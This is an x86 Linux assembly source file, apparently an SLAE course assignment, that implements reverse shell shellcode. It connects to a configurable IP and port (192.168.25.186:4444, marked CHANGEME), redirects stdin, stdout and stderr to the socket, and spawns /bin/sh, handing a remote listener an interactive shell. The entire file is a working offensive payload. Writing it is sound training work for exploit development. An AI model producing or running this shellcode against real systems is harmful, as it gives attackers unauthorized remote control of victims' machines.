; SLAE Assignment #02: Reverse Shell
; AUTHOR: SLAE-1262
; Change address and port down at marked location ("CHANGEME")

global _start

section .text

_start:
	
	;### SOCKET PART: ###
	
	;SOCKETCALL (for SOCKET)
	xor eax,eax
	mov al, 102 	;syscall=102 for socketcall
	xor ebx,ebx
	mov bl, 1	;socket function=1 for SYS_SOCKET

	;SYS_SOCKET arguments (in reverse order for stack)
	;int socket(int domain, int type, int protocol);
	xor edx,edx
	push edx	;protocol=0 for IPPROTO_IP
	push ebx	;type=1 for SOCK_STREAM
	push byte 0x02	;domain=2 for AF_INET
	mov ecx,esp	;Pointer to arguments on stack in ecx
	int 0x80	;Run syscall 102
	
	mov esi, eax	;save socket file descriptor

	;SOCKETCALL (for SYS_CONNECT)
	xor eax,eax	
	mov al, 102	;syscall=102 for socketcall
	xor ebx,ebx
	mov bl, 3	;socket function=3 for SYS_CONNECT

	;SYS_CONNECT arguments (in reverse order for stack)
	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	
	;Building sockaddr struct:
	push edx	;0 for from address (any)
	;##########CHANGEME##################################################CHANGEME###
	push dword 0xBA19A8C0	;192.168.25.186 for Destination in (REVERSE) Hex
	push word 0x5C11	;4444 for Destination Port in (REVERSE) Hex
	;##########CHANGEME##################################################ChANGEME###
	push word 0x02	;2 for AF_INET
	mov ecx,esp	;Pointer to sockaddr struct, comes on stack also

	;Main arguments for SYS_CONNECT (rev order)
	push 16		;16 for addrlen
	push ecx	;Pointer to sockaddr struct
	push esi	;sockfd
	mov ecx,esp	;Pointer to arguments
	int 0x80	;run syscall





	;### DUP2 Part ###
	;int dup2(int oldfd, int newfd);i
	;for {stdin,stdout,stderr}=newfd: oldfd=sockfd
	mov ebx,esi	;sockfd as oldfd
	xor ecx,ecx
	mov cl,2	;start with stderr (and count down in a loop)
dup2loop:
	xor eax,eax
	mov al,63	;syscall=63 for dup2
	int 0x80	;run syscall (with loopcounter as newfd)
	dec ecx
	jns dup2loop		;2...0 in loop


		
	;### EXECVE Part ####
	;execve (11) to spawn /bin/sh
	xor eax,eax
	mov al,11 ;syscall=11 for execve
	xor ecx,ecx ;no argv (works!)
	xor edx,edx ;no envp
	push edx ;nullbyte(word)
	push 0x68732f2f ;/bin//sh
	push 0x6e69622f ;(reverse)
	mov ebx, esp ;position of string on stack
	int 0x80 ;run syscall
